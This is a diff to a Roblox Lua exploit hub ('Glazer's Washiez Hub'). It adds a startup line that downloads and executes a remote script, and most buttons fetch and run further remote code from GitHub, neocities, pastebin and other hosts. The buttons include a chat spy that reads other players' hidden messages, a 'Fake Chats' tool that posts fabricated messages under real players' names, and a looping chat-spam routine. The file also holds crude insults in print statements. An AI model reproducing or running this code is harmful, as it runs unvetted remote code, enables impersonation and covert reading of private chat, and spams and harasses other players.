@@ -10,6 +10,9 @@ Credits to BBQ
 Brought to you by Jinquillivus Productions
 ]]--
 
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/AnthonyIsntHere/anthonysrepository/main/scripts/AntiChatLogger.lua", true))()
+
 local gui = Instance.new("ScreenGui")
 gui.Name = "Glazer's Washiez Hub"
 gui.Parent = game.Players.LocalPlayer:WaitForChild("PlayerGui")
@@ -17,7 +20,7 @@ gui.Parent = game.Players.LocalPlayer:WaitForChild("PlayerGui")
 -- Main Frame
 local mainFrame = Instance.new("Frame")
 mainFrame.Name = "MainFrame"
-mainFrame.Size = UDim2.new(0, 400, 0, 600) -- Adjusted size to fit all buttons
+mainFrame.Size = UDim2.new(0, 400, 0, 590) -- Adjusted size to fit all buttons
 mainFrame.Position = UDim2.new(0.5, -200, 0.5, -350)
 mainFrame.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
 mainFrame.BorderSizePixel = 0
@@ -70,7 +73,7 @@ local function createButton(name, scriptFunc, position)
     local button = Instance.new("TextButton")
     button.Name = name .. "Button"
     button.Text = name
-    button.Size = UDim2.new(0, 360, 0, 40)
+    button.Size = UDim2.new(0, 360, 0, 25)
     button.Position = UDim2.new(0.5, -180, 0, position)
     button.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
     button.TextColor3 = Color3.fromRGB(255, 255, 255)
@@ -84,197 +87,349 @@ local function createButton(name, scriptFunc, position)
 
     button.MouseButton1Click:Connect(scriptFunc)
 end
-createButton("Teamspy", function()
---[[
-	Simple Chat Spy
-	Type "spy" to enable or disable the chat spy.
-	Only tested if this works executed with Synapse (should work with other exploits though)
---]]
-
-print("-- Chat Spy Executed --")
-print("Type \"spy\" to enable or disable the chat spy.")
-print("Only tested if this works executed with Synapse (should work with other exploits though)")
-print("https://github.com/dehoisted/Chat-Spy")
-
--- Config
-Config = {
-	enabled = true,
-	spyOnMyself = true,
-	public = true,
-	publicItalics = true
-}
-
--- Customizing Log Output
-PrivateProperties = {
-	Color = Color3.fromRGB(0,255,255); 
-	Font = Enum.Font.SourceSansBold;
-	TextSize = 18;
-}
-
-	local StarterGui = game:GetService("StarterGui")
-	local Players = game:GetService("Players")
-	local player = Players.LocalPlayer
-	local saymsg = game:GetService("ReplicatedStorage"):WaitForChild("DefaultChatSystemChatEvents"):WaitForChild("SayMessageRequest")
-	local getmsg = game:GetService("ReplicatedStorage"):WaitForChild("DefaultChatSystemChatEvents"):WaitForChild("OnMessageDoneFiltering")
-	local instance = (_G.chatSpyInstance or 0) + 1
-	_G.chatSpyInstance = instance
-
-	local function onChatted(p,msg)
-		if _G.chatSpyInstance == instance then
-			if p==player and msg:lower():sub(1,4)=="/spy" then
-				Config.enabled = not Config.enabled
-				wait(0.3)
-				PrivateProperties.Text = "{SPY "..(Config.enabled and "EN" or "DIS").."ABLED}"
-				StarterGui:SetCore("ChatMakeSystemMessage", PrivateProperties)
-			elseif Config.enabled and (Config.spyOnMyself==true or p~=player) then
-				msg = msg:gsub("[\n\r]",''):gsub("\t",' '):gsub("[ ]+",' ')
-				local hidden = true
-				local conn = getmsg.OnClientEvent:Connect(function(packet,channel)
-					if packet.SpeakerUserId==p.UserId and packet.Message==msg:sub(#msg-#packet.Message+1) and (channel=="All" or (channel=="Team" and Config.public==false and Players[packet.FromSpeaker].Team==player.Team)) then
-						hidden = false
-					end
-				end)
-				wait(1)
-				conn:Disconnect()
-				if hidden and Config.enabled then
-					if Config.public then
-						saymsg:FireServer((Config.publicItalics and "BH leaks" or 'BH leaks').."leaks: [".. p.Name .."]: "..msg,"team")
-					else
-						PrivateProperties.Text = "{SPY} [".. p.Name .."]: "..msg
-						StarterGui:SetCore("ChatMakeSystemMessage", PrivateProperties)
-					end
-				end
-			end
-		end
-	end
-	
-	for _,p in ipairs(Players:GetPlayers()) do
-		p.Chatted:Connect(function(msg) onChatted(p,msg) end)
-	end
-
-	Players.PlayerAdded:Connect(function(p)
-		p.Chatted:Connect(function(msg) onChatted(p,msg) end)
-	end)
-
-	PrivateProperties.Text = "{SPY "..(Config.enabled and "EN" or "DIS").."ABLED}"
-	StarterGui:SetCore("ChatMakeSystemMessage", PrivateProperties)
-	local chatFrame = player.PlayerGui.Chat.Frame
-	chatFrame.ChatChannelParentFrame.Visible = true
-	chatFrame.ChatBarParentFrame.Position = chatFrame.ChatChannelParentFrame.Position+UDim2.new(UDim.new(),chatFrame.ChatChannelParentFrame.Size.Y)
-end, 50)
+createButton("Coming soon", function()
+print("its coming soon you stupid fucking dipwad. what did you think would happen?")
+end, 60)
 
 createButton("Spychat", function()
---[[
-	Simple Chat Spy
-	Type "spy" to enable or disable the chat spy.
-	Only tested if this works executed with Synapse (should work with other exploits though)
---]]
+if not game:IsLoaded() then
+    game.Loaded:Wait()
+end
 
-print("-- Chat Spy Executed --")
-print("Type \"spy\" to enable or disable the chat spy.")
-print("Only tested if this works executed with Synapse (should work with other exploits though)")
-print("https://github.com/dehoisted/Chat-Spy")
+local Players = game:GetService("Players")
+local ChatService = game:GetService("Chat")
+local TextChatService = game:GetService("TextChatService")
 
--- Config
-Config = {
-	enabled = true,
-	spyOnMyself = true,
-	public = false,
-	publicItalics = true
-}
+Clr = Color3.fromRGB(255, 255, 255)
 
--- Customizing Log Output
-PrivateProperties = {
-	Color = Color3.fromRGB(255,0,255); 
-	Font = Enum.Font.SourceSansBold;
-	TextSize = 18;
-}
+local PublicChats = {}
 
-	local StarterGui = game:GetService("StarterGui")
-	local Players = game:GetService("Players")
-	local player = Players.LocalPlayer
-	local saymsg = game:GetService("ReplicatedStorage"):WaitForChild("DefaultChatSystemChatEvents"):WaitForChild("SayMessageRequest")
-	local getmsg = game:GetService("ReplicatedStorage"):WaitForChild("DefaultChatSystemChatEvents"):WaitForChild("OnMessageDoneFiltering")
-	local instance = (_G.chatSpyInstance or 0) + 1
-	_G.chatSpyInstance = instance
+-- Set up Spy channel
+local spyChannel = TextChatService.TextChannels:FindFirstChild("Spy")
+if not spyChannel then
+    spyChannel = Instance.new("TextChannel")
+    spyChannel.Name = "Spy"
+    spyChannel.Parent = TextChatService
+end
 
-	local function onChatted(p,msg)
-		if _G.chatSpyInstance == instance then
-			if p==player and msg:lower():sub(1,4)=="/spy" then
-				Config.enabled = not Config.enabled
-				wait(0.3)
-				PrivateProperties.Text = "{SPY "..(Config.enabled and "EN" or "DIS").."ABLED}"
-				StarterGui:SetCore("ChatMakeSystemMessage", PrivateProperties)
-			elseif Config.enabled and (Config.spyOnMyself==true or p~=player) then
-				msg = msg:gsub("[\n\r]",''):gsub("\t",' '):gsub("[ ]+",' ')
-				local hidden = true
-				local conn = getmsg.OnClientEvent:Connect(function(packet,channel)
-					if packet.SpeakerUserId==p.UserId and packet.Message==msg:sub(#msg-#packet.Message+1) and (channel=="All" or (channel=="Team" and Config.public==false and Players[packet.FromSpeaker].Team==player.Team)) then
-						hidden = false
-					end
-				end)
-				wait(1)
-				conn:Disconnect()
-				if hidden and Config.enabled then
-					if Config.public then
-						saymsg:FireServer((Config.publicItalics and "BH leaks" or 'BH leaks').."leaks: [".. p.Name .."]: "..msg,"All")
-					else
-						PrivateProperties.Text = "{SPY} [".. p.Name .."]: "..msg
-						StarterGui:SetCore("ChatMakeSystemMessage", PrivateProperties)
-					end
-				end
-			end
-		end
-	end
-	
-	for _,p in ipairs(Players:GetPlayers()) do
-		p.Chatted:Connect(function(msg) onChatted(p,msg) end)
-	end
+local function Public(msg)
+    for _, v in ipairs(PublicChats) do
+        if v == msg then
+            return true
+        end
+    end
+    return false
+end
 
-	Players.PlayerAdded:Connect(function(p)
-		p.Chatted:Connect(function(msg) onChatted(p,msg) end)
-	end)
+local function Log(Name, Msg)
+    if not Public(Msg) then
+        print("[" .. Name .. "]: " .. Msg)
 
-	PrivateProperties.Text = "{SPY "..(Config.enabled and "EN" or "DIS").."ABLED}"
-	StarterGui:SetCore("ChatMakeSystemMessage", PrivateProperties)
-	local chatFrame = player.PlayerGui.Chat.Frame
-	chatFrame.ChatChannelParentFrame.Visible = true
-	chatFrame.ChatBarParentFrame.Position = chatFrame.ChatChannelParentFrame.Position+UDim2.new(UDim.new(),chatFrame.ChatChannelParentFrame.Size.Y)
-end, 100)
+        local Target = Name
+        local message = Msg
 
-createButton("See Warnings", function()
-loadstring(game:HttpGet("https://raw.githubusercontent.com/illumina0001/bloxton/main/seewarnings.lua"))()
+        local plr = Players:FindFirstChild(Target)
+        if plr and plr.Character and plr.Character:FindFirstChild("Head") then
+            ChatService:Chat(plr.Character.Head, message, "White")
+        end
+
+        -- Show in custom "Spy" chat tab
+        if spyChannel then
+            spyChannel:DisplaySystemMessage("[" .. Name .. "]: " .. Msg)
+        end
+
+        -- Optional: also display in RBXGeneral if needed
+        TextChatService.TextChannels.RBXGeneral:DisplaySystemMessage("[" .. Name .. "]: " .. Msg)
+    end
+end
+
+local function playerJoined(player)
+    player.Chatted:Connect(function(m)
+        task.wait(0.02)
+        if not Public(m) and player ~= Players.LocalPlayer then
+            Log(player.Name, m)
+        end
+    end)
+end
+
+for _, player in ipairs(Players:GetPlayers()) do
+    playerJoined(player)
+end
+
+Players.PlayerAdded:Connect(playerJoined)
+Players.PlayerRemoving:Connect(function() end)
+
+-- Capture filtered messages to avoid duplication
+TextChatService.OnIncomingMessage = function(message)
+    if message.TextSource then
+        local userId = message.TextSource.UserId
+        local speaker = Players:GetPlayerByUserId(userId)
+
+        if speaker and speaker ~= Players.LocalPlayer then
+            table.insert(PublicChats, message.Text)
+        end
+    end
+end
+end, 90)
+
+
+createButton("Fake Chats", function()
+local Players = game:GetService("Players")
+local ChatService = game:GetService("Chat")
+local UserInputService = game:GetService("UserInputService")
+local TweenService = game:GetService("TweenService")
+local StarterGui = game:GetService("StarterGui")
+
+local localPlayer = Players.LocalPlayer
+
+-- Create the ScreenGui
+local screenGui = Instance.new("ScreenGui")
+screenGui.Name = "CommandBarGui"
+screenGui.ResetOnSpawn = false
+screenGui.Parent = localPlayer:WaitForChild("PlayerGui")
+
+------------------------------------------------------------------
+-- Command Bar Frame (initially off-screen)
+------------------------------------------------------------------
+local commandBarFrame = Instance.new("Frame")
+commandBarFrame.Name = "CommandBarFrame"
+commandBarFrame.Size = UDim2.new(0, 300, 0, 40)
+-- start off-screen (below the visible area)
+commandBarFrame.Position = UDim2.new(0.5, -150, 1, 10)
+commandBarFrame.BackgroundColor3 = Color3.fromRGB(50, 50, 50)
+commandBarFrame.BorderSizePixel = 2
+commandBarFrame.Visible = false
+commandBarFrame.Parent = screenGui
+
+-- Command Bar TextBox
+local commandBar = Instance.new("TextBox")
+commandBar.Name = "CommandBar"
+commandBar.Size = UDim2.new(1, -10, 1, -10)
+commandBar.Position = UDim2.new(0, 5, 0, 5)
+commandBar.BackgroundColor3 = Color3.fromRGB(200, 200, 200)
+commandBar.ClearTextOnFocus = false
+commandBar.PlaceholderText = "Type: Name Message and press Enter"
+commandBar.Text = ""
+commandBar.Parent = commandBarFrame
+
+------------------------------------------------------------------
+-- Toggle Button (draggable)
+------------------------------------------------------------------
+local toggleButton = Instance.new("TextButton")
+toggleButton.Name = "ToggleButton"
+toggleButton.Size = UDim2.new(0, 50, 0, 30)
+toggleButton.Position = UDim2.new(0, 10, 0.5, -15)
+toggleButton.Text = "Open"
+toggleButton.Active = true       -- allow for dragging
+toggleButton.Draggable = true    -- make it draggable
+toggleButton.Parent = screenGui
+
+local commandBarOpen = false
+
+------------------------------------------------------------------
+-- Tween Functions
+------------------------------------------------------------------
+local function tweenCommandBarUp()
+    commandBarFrame.Visible = true
+    local tweenInfo = TweenInfo.new(0.3, Enum.EasingStyle.Quad, Enum.EasingDirection.Out)
+    local goal = {Position = UDim2.new(0.5, -150, 0.9, 0)}
+    local tween = TweenService:Create(commandBarFrame, tweenInfo, goal)
+    tween:Play()
+end
+
+local function tweenCommandBarDown()
+    local tweenInfo = TweenInfo.new(0.3, Enum.EasingStyle.Quad, Enum.EasingDirection.In)
+    local goal = {Position = UDim2.new(0.5, -150, 1, 10)}
+    local tween = TweenService:Create(commandBarFrame, tweenInfo, goal)
+    tween:Play()
+    tween.Completed:Connect(function()
+        commandBarFrame.Visible = false
+    end)
+end
+
+------------------------------------------------------------------
+-- Toggle Command Bar
+------------------------------------------------------------------
+local function toggleCommandBar()
+    commandBarOpen = not commandBarOpen
+    if commandBarOpen then
+        toggleButton.Text = "Close"
+        tweenCommandBarUp()
+        -- We'll focus the TextBox AFTER the bar is shown
+        -- (but only once "C" is released -- see InputEnded below)
+    else
+        toggleButton.Text = "Open"
+        tweenCommandBarDown()
+    end
+end
+
+toggleButton.MouseButton1Click:Connect(toggleCommandBar)
+
+------------------------------------------------------------------
+-- Hide/Show ALL UI with "T"
+------------------------------------------------------------------
+local uiHidden = false
+
+------------------------------------------------------------------
+-- Key Handling (on InputEnded to avoid typing "c")
+------------------------------------------------------------------
+UserInputService.InputEnded:Connect(function(input, gameProcessed)
+    if gameProcessed then return end
+
+    if input.KeyCode == Enum.KeyCode.C then
+        -- Toggle the command bar on key release
+        toggleCommandBar()
+        if commandBarOpen then
+            -- Now that "C" is fully released, focus the TextBox
+            commandBar:CaptureFocus()
+        end
+
+    elseif input.KeyCode == Enum.KeyCode.T then
+        -- Hide/Show entire UI
+        uiHidden = not uiHidden
+        if uiHidden then
+            toggleButton.Visible = false
+            commandBarFrame.Visible = false
+            commandBarOpen = false
+        else
+            toggleButton.Visible = true
+            toggleButton.Text = "Open"
+            commandBarFrame.Visible = false
+        end
+    end
+end)
+
+------------------------------------------------------------------
+-- Helper: Convert Color3 to Hex
+------------------------------------------------------------------
+local function Color3ToHex(color)
+    return string.format("#%02X%02X%02X",
+        math.floor(color.R * 255),
+        math.floor(color.G * 255),
+        math.floor(color.B * 255)
+    )
+end
+
+------------------------------------------------------------------
+-- Handle Enter in Command Bar
+------------------------------------------------------------------
+commandBar.FocusLost:Connect(function(enterPressed)
+    if not enterPressed then return end
+    
+    local text = commandBar.Text
+    if text == "" then
+        warn("No input provided.")
+    else
+        -- Parse the command:
+        -- first word = target's name, the rest = message
+        local spaceIndex = string.find(text, " ")
+        if not spaceIndex then
+            warn("Please type the target name and a message, separated by a space.")
+        else
+            local pName = text:sub(1, spaceIndex - 1)
+            local msg = text:sub(spaceIndex + 1)
+
+            if pName == "" or msg == "" then
+                warn("Please provide both a target name and a message.")
+            else
+                -- Find the target player: exact or partial match
+                local targetPlayer = Players:FindFirstChild(pName)
+                if not targetPlayer then
+                    for _, p in ipairs(Players:GetPlayers()) do
+                        local displayLower = string.lower(p.DisplayName)
+                        local nameLower = string.lower(p.Name)
+                        local inputLower = string.lower(pName)
+                        if string.find(displayLower, inputLower) or string.find(nameLower, inputLower) then
+                            targetPlayer = p
+                            break
+                        end
+                    end
+                end
+
+                if not targetPlayer then
+                    warn("No matching player found for:", pName)
+                else
+                    -- Determine chat color
+                    local chatColor = targetPlayer.Team and targetPlayer.Team.TeamColor.Color or Color3.fromRGB(255, 255, 255)
+                    local hexColor = Color3ToHex(chatColor)
+
+                    local displayName = targetPlayer.DisplayName or targetPlayer.Name
+
+                    -- Bubble chat (if player's head exists)
+                    if targetPlayer.Character and targetPlayer.Character:FindFirstChild("Head") then
+                        ChatService:Chat(targetPlayer.Character.Head, msg, Enum.ChatColor.White)
+                    end
+
+                    -- System message: [Name]: Message
+                    StarterGui:SetCore("ChatMakeSystemMessage", {
+                        Text = string.format('<font color="%s">[%s]:</font> %s', hexColor, displayName, msg),
+                        Font = Enum.Font.SourceSansBold,
+                        FontSize = Enum.FontSize.Size96,
+                        Color = Color3.fromRGB(255, 255, 255),
+                    })
+                end
+            end
+        end
+    end
+
+    -- Always close the bar after Enter
+    commandBar.Text = ""
+    if commandBarOpen then
+        commandBarOpen = false
+        toggleButton.Text = "Open"
+        tweenCommandBarDown()
+    end
+end)
 end, 150)
 
-createButton("Penis Plate", function()
-loadstring(game:HttpGet("https://tuxer.xyz/loader?file=penisplates"))()
-end, 200)
+createButton("Advertisement spam", function()
+if not game:IsLoaded() then
+    game.Loaded:Wait()
+end
+while true do
+task.wait(3)
+local TextChatService = game:GetService("TextChatService")
+function chat(msg)
 
-createButton("Nameless", function()
+            TextChatService.TextChannels.RBXGeneral:SendAsync(msg)
+
+    end
+
+                blob = "\u{000D}"
+                chat("." .. blob .. " ".. blob .. " ".. blob .. " ".. blob .. " ".. blob .. " ".. blob .. " ".. blob .. " ".. blob .. " ".. blob .. " ".. blob .. " ".. blob .. " ".. blob .. " ".. blob .. " ".. blob .. " ".. blob .. " ".. blob .. " ".. blob .. " ".. blob .. " ".. blob .. " ".. blob .. " ".. blob .. " ".. blob .. " ".. blob .. " ".. blob .. " ".. blob .. " ".. blob .. " ".. blob .. " ".. blob .. " ".. blob .. " ".. blob .. " ".. blob .. " ".. blob .. " ".. blob .. " ".. blob .. " ".. blob .. " ".. blob .. " ".. blob .. " ".. blob .. " ".. blob .. " ".. blob .. " ".. blob .. " ".. blob .. " ".. blob .. " ".. blob .. " ".. blob .. " ".. blob .. " ".. blob .. " ".. blob .. " ".. blob .. " ".. blob .. " ".. blob .. " ".. blob .. " ".. blob .. " ".. blob .. " ".. blob .. " ".. blob .. " ".. blob .. " ".. blob .. " ".. blob .. " ".. blob .. " ".. blob .. " ".. blob .. " ".. blob .. " ".. blob .. " ".. blob .. " ".. blob .. " ".. blob .. " ".. blob .. " ".. blob .. "Like trolling? Add green28237 on blue app")
+
+                end
+end, 180)
+
+createButton("Nameless Admin", function()
 loadstring(game:HttpGet("https://raw.githubusercontent.com/FilteringEnabled/NamelessAdmin/main/Source"))()
-end, 250)
+end, 210)
 
-createButton("infinite yield", function()
+createButton("Infinite Yield", function()
 loadstring(game:HttpGet("https://raw.githubusercontent.com/EdgeIY/infiniteyield/master/source"))()
+end, 240)
+
+createButton("Coming Soon", function()
+print("its coming soon you stupid fucking dipwad. what did you think would happen?")
+end, 270)
+--dont blame me. glazerbot sucked dick bro.
+createButton("Scalp Bot", function()
+loadstring(game:HttpGet("https://raw.githubusercontent.com/TenTenClown/Jinquilivuscript/refs/heads/main/Scalpbot"))()
 end, 300)
 
-createButton("GlazerBot", function()
-loadstring(game:HttpGet("https://raw.githubusercontent.com/TenTenClown/Jinquilivuscript/refs/heads/main/Glazerbot"))()
-end, 350)
-
-createButton("fake cuff", function()
+createButton("Fake Cuff", function()
 loadstring(game:HttpGet("https://raw.githubusercontent.com/TenTenClown/Jinquilivuscript/refs/heads/main/fakecuff"))()
-end, 400)
+end, 330)
 
 createButton("Ghost Mode", function()
     loadstring(game:HttpGet('https://korisnik99.neocities.org/message%20(2).txt'))()
-end, 450)
+end, 360)
 
 createButton("R6", function()
     loadstring(game:HttpGet('https://korisnik99.neocities.org/message%20(6).txt'))()
-end, 500)
+end, 390)
 
-createButton("animation changer", function()
+createButton("Animation Changer", function()
 local AnimationChanger = Instance.new("ScreenGui")
 local Main = Instance.new("Frame")
 local TopBar = Instance.new("Frame")
@@ -953,7 +1108,19 @@ end)
 
 wait(1)
 Main:TweenPosition(UDim2.new(0.421999991, 0, 0.28400004, 0))
+end, 420)
+
+createButton("Coming Soon", function()
+print("its coming soon you stupid fucking dipwad. what did you think would happen?")
 end, 450)
+
+createButton("Dead Body Pose", function()
+loadstring(game:HttpGet("https://pastebin.com/raw/y9T3mzqD"))()
+end, 480)
+
+createButton("Item Drone", function()
+loadstring(game:HttpGet("https://raw.githubusercontent.com/TenTenClown/Jinquilivuscript/refs/heads/main/Prop%20Control"))()
+end, 510)
 
 -- Hide Button
 local hideButton = Instance.new("TextButton")
@@ -1064,3 +1231,5 @@ game.Players.PlayerAdded:Connect(function(player)
     end
 end)
 end
+
+
